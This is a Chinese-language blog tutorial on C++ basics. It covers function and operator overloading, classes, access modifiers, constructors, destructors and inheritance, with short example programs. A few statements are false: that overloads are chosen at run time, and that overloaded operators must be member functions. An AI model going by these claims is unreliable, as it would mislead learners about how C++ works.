<h4 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h4><p>在 C++ 中，**函数重载允许在同一个作用域中定义多个同名函数，不过它们的参数列表需要不同(**参数类型，数量，或者顺序至少有一项不同)</p>
<p>代码示例如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">type</span><span class="params">(<span class="type">int</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;This is data of type int&quot;</span> &lt;&lt; std::endl; </span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">type</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;This is data of type const char *&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">type</span><span class="params">(<span class="type">double</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;This is data of type double&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">type</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    <span class="built_in">type</span>(<span class="number">123</span>);</span><br><span class="line">	<span class="built_in">type</span>(<span class="number">0.06</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301042053567.png" alt="image-20230104205318468"></p>
<p>可以发现我定义了三个 <code>type</code> 函数，他们的函数名一样，但是参数的类型不一样，而在main函数中调用了三次 <code>type</code> 函数，根据传入的参数不同调用相匹配的那个函数来执行。<strong>实现原理是编译器在编译代码时把所有函数的签名都记录下来，然后在运行时根据函数提供的参数来选择某个函数</strong>。</p>
<h4 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h4><p>但实际上对于 <code>&lt;&lt;</code> 还涉及到了一个重载运算符，简单来说重载运算符指的是我们可以赋予原本运算符新的意义，<strong>重载运算符本质上是</strong>带有特殊名称的<strong>函数</strong>，重载运算符函数(也就是函数名)由关键字 <code>operator</code> 和要重载的运算符构成。</p>
<p>举个例子，我现在创建了一个Box类，然后实例化对象是一个 <code>box</code> ，具有长，宽，高的属性，我现在希望将+重载，使其可以让两个Box对象的每个属性相加。</p>
<p>代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="type">int</span> length;</span><br><span class="line">		<span class="type">int</span> width;</span><br><span class="line">		<span class="type">int</span> height;</span><br><span class="line">		Box <span class="keyword">operator</span>+(<span class="type">const</span> Box&amp; box2)</span><br><span class="line">		&#123;</span><br><span class="line">			Box box3;</span><br><span class="line">			box3.length=<span class="keyword">this</span>-&gt;length + box2.length;</span><br><span class="line">			box3.width=<span class="keyword">this</span>-&gt;width + box2.width;</span><br><span class="line">			box3.height=<span class="keyword">this</span>-&gt;height + box2.height;</span><br><span class="line">			<span class="keyword">return</span> box3;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Box box1,box2,box3;</span><br><span class="line">	box1.length=<span class="number">1</span>;</span><br><span class="line">	box1.width=<span class="number">2</span>;</span><br><span class="line">	box1.height=<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">	box2.length=<span class="number">10</span>;</span><br><span class="line">	box2.width=<span class="number">20</span>;</span><br><span class="line">	box2.height=<span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">	box3=box1+box2;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;The length of the box3 is &quot;</span> &lt;&lt;box3.length &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;The width of the box3 is &quot;</span> &lt;&lt; box3.width &lt;&lt;std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;The height of the box3 is &quot;</span> &lt;&lt; box3.height &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301042229281.png" alt="image-20230104222911178"></p>
<p>在 <code>Box</code> 这个类中，我们用 <code>operator</code> 指定了重载的运算符为 <code>+</code> ，这二者合成了重载运算符函数，函数名前的依然是函数类型，而后面的括号里装的依然是参数，看起来和正常的函数定义一样。</p>
<p>但需要注意的以下几点</p>
<ol>
<li>重载运算符函数的参数，在上面的例子中， <code>+</code> 两侧的 <code>box1</code> 和<code>box2</code> 是两个参数传入给<code>operator+</code> 这个重载运算符函数，但是实际上定义的地方，你可以看见我写代码中只有一个参数 <code>box2</code> ，实际上第一个对象已经被当做参数进行了传递，该对象的属性需要用 <code>this</code> 运算符进行访问(关于 <code>this</code> 指针，后面会提到)。</li>
<li>观察上面的代码，发现在重载运算符函数的参数中，出现了 <code>const</code> 和 <code>&amp;</code> ，这是因为程序为了保证正确性和效率采取的措施。关于 <code>const</code> ,它是<strong>用来保护函数内部不被意外修改的对象</strong>，例如你重载了加法运算符，那么两个参数都应该是常量，因为它们在函数内部不应该被修改，所以加上 <code>const</code> 也就是说你的函数不会修改类内的任何成员变量，那么就可以将函数声明为 <code>const</code> 类型。关于**<code>&amp;</code> ,它是用来避免拷贝对象的开销的<strong>，提到这里就不得不说</strong>在 C++ 中如果函数的参数是一个对象，那么调用函数时会进行对象的拷贝**，而如果加上 <code>&amp;</code>引用的话，就可以避免拷贝对象造成的开销，提升了程序的效率。但是不加 <code>&amp;</code> 的话，也有一些优点，比如拷贝对象的话，函数内部对对象的修改不会影响原来的对象</li>
<li><strong>重载运算符函数必须是类的成员函数</strong>，也就是你想重载一个运算符，就必须要定义一个类，然后在类的内部定义重载运算符函数。</li>
</ol>
<p>因此根据上面的内容，就可以分析出来std::cout &lt;&lt;实际上是调用了运算符重载函数 <code>cout.operator &lt;&lt; ()</code> ，根据传入的不同参数类型，调用相匹配的重载函数。</p>
<h3 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h3><p>笔记本电脑和台式电脑都属于计算机，计算机有的基本属性，笔记本和台式肯定都有。假设现在有一个任务是要记录计算机的基础配置，并且在之后一段时间还需要记录台式电脑的配置和笔记本电脑的配置，我们可以怎么做，写一个结构体，来记录计算机的配置？然后等到台式就再写一个结构体？如果需要写某个牌子的笔记本电脑的信息就再写N个？(实际上这是个很糟糕的例子,hhh)</p>
<p>不不不，你可能已经猜到我想用什么了，没错，就是用类与对象的概念来实现上述这个问题。</p>
<p>现在抛开之后的任务，只记录计算机的基本信息，并且将其实例化成一个个的对象(你可以将这个实例化的过程理解为将一个抽象的计算机配置突然实例成某个具体品牌的计算机)</p>
<p>举个例子，计算机都具有硬盘，内存，CPU，显卡，IO设备等等。</p>
<p>那么我们可以这么定义一个计算机类，代码如下</p>
<p>此处的各个属性都是我随便写的，理解意思就好，不是真的要介绍各个硬件的信息。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Computer</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="type">int</span> Hard_disk;</span><br><span class="line">		<span class="type">int</span> Memory;</span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *CPU;</span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *Video_card;</span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *IO;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Computer Lenovo;</span><br><span class="line">	Lenovo.Hard_disk=<span class="number">128</span>;</span><br><span class="line">	Lenovo.Memory=<span class="number">8</span>;</span><br><span class="line">	Lenovo.CPU=<span class="string">&quot;xxx-1&quot;</span>;</span><br><span class="line">	Lenovo.Video_card=<span class="string">&quot;ttt-1&quot;</span>;</span><br><span class="line">	Lenovo.IO=<span class="string">&quot;uuu-1&quot;</span>;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;The Hard disk is &quot;</span> &lt;&lt; Lenovo.Hard_disk &lt;&lt; <span class="string">&quot;G&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;The Memory is &quot;</span> &lt;&lt; Lenovo.Memory &lt;&lt; <span class="string">&quot;G&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;The CPU is &quot;</span> &lt;&lt; Lenovo.CPU &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;The Video_card is &quot;</span> &lt;&lt; Lenovo.Video_card &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;The IO is &quot;</span> &lt;&lt; Lenovo.IO &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301050013916.png" alt="image-20230105001321846"></p>
<p>上述代码定义了一个 <code>Computer</code> 类，然后实例化的对象为 <code>Lenovo</code> ，对其所有属性都进行了初始化。语法很简单，此处代码主要讲两个点。第一就是实例化后的对象在哪里？第二个就是类中有一个 <code>public</code> ，这个是干啥的？</p>
<h4 id="类实例化后的对象存放到哪里？"><a href="#类实例化后的对象存放到哪里？" class="headerlink" title="类实例化后的对象存放到哪里？"></a>类实例化后的对象存放到哪里？</h4><p>实例化后的对象有两种存储位置，分别是栈和堆。</p>
<p>上面的代码中，因为函数内的局部变量是位于栈上，而 <code>Lenovo</code> 是main函数的局部变量，所以 <code>Lenovo</code> 这个对象位于栈上。</p>
<p>如果主动使用了 <code>new</code> 函数来分配内存给实例化后的对象，那么该对象的内存就会位于堆上，将上面的代码做如下修改，即可让其位于堆上，不再使用该对象的时候需要手动调用 <code>delete</code> 进行销毁，避免内存泄露的问题</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Computer *Lenovo = <span class="keyword">new</span> Computer;</span><br><span class="line">Lenovo-&gt;Hard_disk = <span class="number">128</span>;</span><br><span class="line">Lenovo-&gt;Memory = <span class="number">8</span>;</span><br><span class="line">Lenovo-&gt;CPU = <span class="string">&quot;xxx-1&quot;</span>;</span><br><span class="line">Lenovo-&gt;Video_card = <span class="string">&quot;ttt-1&quot;</span>;</span><br><span class="line">Lenovo-&gt;IO = <span class="string">&quot;uuu-1&quot;</span>;</span><br></pre></td></tr></table></figure>



<h4 id="类访问修饰符-amp-amp-数据封装"><a href="#类访问修饰符-amp-amp-数据封装" class="headerlink" title="类访问修饰符&amp;&amp;数据封装"></a>类访问修饰符&amp;&amp;数据封装</h4><p>关键字  <code>public</code> <code> private</code> <code>protected</code> 成为访问修饰符，它们标记的区域内可以设置成员变量的访问属性，比如上面的例子里，在main函数中我对 <code>Lenovo</code> 对象中的 <code>Memory</code> 成员进行了赋值为 <code>8</code> 的操作，之所以能够这样直接赋值是因为我将其定义为了公有（<code> public</code> ）成员，这就意味这我用 <code>.</code> 可以直接访问公有成员，但如果我将成员设置为私有（ <code>private</code> ）成员就无法这样直接访问了，正如同下面的代码一样</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="type">int</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Box box;</span><br><span class="line">	box.length=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301051616143.png" alt="image-20230105161601838"></p>
<p>可以看到编译是给了一个 <code>error</code> 提示说 <code>Box::length</code> 这个成员是私有的，所以这里无法赋值。</p>
<p>因此我们可以将代码改成下面这样,通过公有的成员函数来访问私有的成员（<strong>所谓的私有成员指的是只能在类的内部被访问，而无法在外部进行访问</strong>），而公有的成员函数（在类内声明或定义的函数）自然是能够被外部访问。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="type">int</span> length;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			length=len;</span><br><span class="line">			std::cout &lt;&lt; length &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Box box;</span><br><span class="line">	box.<span class="built_in">set_length</span>(<span class="number">60</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关于 <code>protected</code> 修饰符与 <code>private</code> 非常类似，不同之处在于 <code>protected</code> 成员在派生类中是可以访问的。</p>
<p>你可能会问这个类访问修饰符出现的意义是什么？其实这就体现了 C++ 中的<strong>数据封装</strong>，我们可以将数据成员定义为私有，然后通过公有的成员函数作为接口来访问和操作私有成员，而无需知道具体实现的细节，这样就可以将实现细节与使用者隔离开，提高代码的可读性和可维护性。</p>
<h3 id="类构造函数-amp-amp-析构函数"><a href="#类构造函数-amp-amp-析构函数" class="headerlink" title="类构造函数&amp;&amp;析构函数"></a>类构造函数&amp;&amp;析构函数</h3><p>假设我现在想创建一个对象，就输出一个 <code>created successly</code> 或者是进行初始化的一些操作，总之就是在创建一个对象的时候自动调用一个函数来实现一些功能。那就需要用到构造函数了，它会在每次创建新对象的时候就被调用。</p>
<p>构造函数的名称要与类名一致，并且没有类型（也就是没有返回值类型）</p>
<p>代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="type">int</span> length;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="built_in">Box</span>(<span class="type">void</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;created successly!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			length=len;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">add_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			length+=len;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">output_length</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; length &lt;&lt; std:: endl;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Box *p = <span class="keyword">new</span> <span class="built_in">Box</span>();</span><br><span class="line">	p-&gt;<span class="built_in">set_length</span>(<span class="number">20</span>);</span><br><span class="line">	p-&gt;<span class="built_in">add_length</span>(<span class="number">4</span>);</span><br><span class="line">	p-&gt;<span class="built_in">output_length</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301051700123.png" alt="image-20230105170056041"></p>
<p>当然了在上面的例子中也可以进行初始化的工作，比如想将每次创建的对象中的 <code>length</code> 都设置为100，那只需要对构造函数进行传参对 <code>length</code> 进行赋值即可。</p>
<p>假设我创建了一个对象，在释放前进行了一些打开文件和申请内存的操作，那么我希望在删除这个对象的时候，可以关闭之前打开的文件或者释放申请之前的内存，那这就要用到析构函数了，它会在删除对象的时候自动被触发，名字是在类名前面加了一个 <code>~</code> ，跟构造函数的利用类似，下面举例在每次删除对象的时候打印 <code>destruction succeeded!</code> </p>
<p>代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="type">int</span> length;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="built_in">Box</span>(<span class="type">void</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;created successly!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">		~<span class="built_in">Box</span>(<span class="type">void</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;destruction succeeded!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			length=len;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">add_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			length+=len;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">output_length</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; length &lt;&lt; std:: endl;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Box *p = <span class="keyword">new</span> <span class="built_in">Box</span>();</span><br><span class="line">	p-&gt;<span class="built_in">set_length</span>(<span class="number">20</span>);</span><br><span class="line">	p-&gt;<span class="built_in">add_length</span>(<span class="number">4</span>);</span><br><span class="line">	p-&gt;<span class="built_in">output_length</span>();</span><br><span class="line">	<span class="keyword">delete</span> p;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301051753557.png" alt="image-20230105175301371"></p>
<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>继承指的是类与类之间的一种关系，假设有一个类 <code>A</code> ，然后它具有 <code>100</code> 个属性，但是我现在希望去定义一个类 <code>B</code> ，它在原本 <code>A</code> 有的 <code>100</code> 个属性前提下再创建 <code>20</code> 个属性，怎么做呢？确实可以选择之间将类 <code>A</code> 的代码 <code>copy</code> 到  <code>B</code> 中，但这样显的代码过于臃肿。所以我们可以用继承， <code>B</code> 继承 <code>A</code> 所有的属性，在此基础上再增加自己新的属性。</p>
<p>下面的代码展示了继承</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="type">int</span> length;</span><br><span class="line">		<span class="type">int</span> width;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			length=len;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">add_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			length+=len;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">output_length</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;length is &quot;</span> &lt;&lt;length &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BBox</span> : <span class="keyword">public</span> Box</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="type">int</span> hight;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">set_hight</span><span class="params">(<span class="type">int</span> hei)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			hight=hei;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">output_hight</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;hight is &quot;</span> &lt;&lt; hight &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BBox box;</span><br><span class="line">	box.<span class="built_in">set_length</span>(<span class="number">20</span>);</span><br><span class="line">	box.<span class="built_in">set_hight</span>(<span class="number">30</span>);</span><br><span class="line">	box.<span class="built_in">output_length</span>();</span><br><span class="line">	box.<span class="built_in">output_hight</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301051935782.png" alt="image-20230105193512645"></p>
<p>由此可以看出来， <code>BBox</code> 这个类（派生类）继承了 <code>BOX</code> 类（基类），然后实例化出来的 <code>box</code> 对象既拥有原本基类的属性和方法，又拥有新增加的属性和方法。</p>
<p>需要补充的是在定义这个继承类的时候执行了 <code>class BBox : public Box</code> 再次使用了 <code>public</code>  这个访问修饰符，标明了继承类型。我们通常使用 <code>public</code> 继承，很少使用 <code>protected</code> 和 <code>private</code> 继承。使用不同类型继承，遵循以下几个规则：</p>
<ol>
<li><strong>公有继承（public）：</strong>当一个类派生自<strong>公有</strong>基类时，基类的<strong>公有</strong>成员也是派生类的<strong>公有</strong>成员，基类的<strong>保护</strong>成员也是派生类的<strong>保护</strong>成员，基类的<strong>私有</strong>成员不能直接被派生类访问，但是可以通过调用基类的<strong>公有</strong>和<strong>保护</strong>成员来访问。</li>
<li><strong>保护继承（protected）：</strong> 当一个类派生自<strong>保护</strong>基类时，基类的<strong>公有</strong>和<strong>保护</strong>成员将成为派生类的<strong>保护</strong>成员。</li>
<li><strong>私有继承（private）：</strong>当一个类派生自<strong>私有</strong>基类时，基类的<strong>公有</strong>和<strong>保护</strong>成员将成为派生类的<strong>私有</strong>成员。</li>
</ol>
<p>上述规则转自：<a href="https://www.runoob.com/cplusplus/cpp-inheritance.html">C++ 继承 | 菜鸟教程 (runoob.com)</a></p>
<h4 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h4><p>就是类 <code>A</code> 可以同时继承 <code>B</code> 和 <code>C</code> 中的所有属性和方法，被称之为多继承。字面意思就是其作用，指一个类可以同时继承多个类的特征。</p>
<p>代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="type">int</span> length;</span><br><span class="line">		<span class="type">int</span> width;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			length=len;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">add_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			length+=len;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">output_length</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;length is &quot;</span> &lt;&lt;length &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">obj</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *color;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">set_color</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *col)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			color=col;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">output_color</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;color is &quot;</span> &lt;&lt; color &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BBox</span> : <span class="keyword">public</span> Box,<span class="keyword">public</span> obj</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="type">int</span> hight;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">set_hight</span><span class="params">(<span class="type">int</span> hei)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			hight=hei;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">output_hight</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;hight is &quot;</span> &lt;&lt; hight &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BBox box;</span><br><span class="line">	box.<span class="built_in">set_length</span>(<span class="number">20</span>);</span><br><span class="line">	box.<span class="built_in">set_hight</span>(<span class="number">30</span>);</span><br><span class="line">	box.<span class="built_in">output_length</span>();</span><br><span class="line">	box.<span class="built_in">output_hight</span>();</span><br><span class="line">	box.<span class="built_in">set_color</span>(<span class="string">&quot;blue&quot;</span>);</span><br><span class="line">	box.<span class="built_in">output_color</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301052000403.png" alt="image-20230105200054215"></p>
<p>可以看到 <code>BBox</code> 同时继承了 <code>Box</code> 和 <code>obj</code> 两个类的属性和方法，并且成功调用。这个多继承理解起来应该蛮简单的，<strong>值得一提的是构造函数和析构函数不可以被继承</strong>。</p>
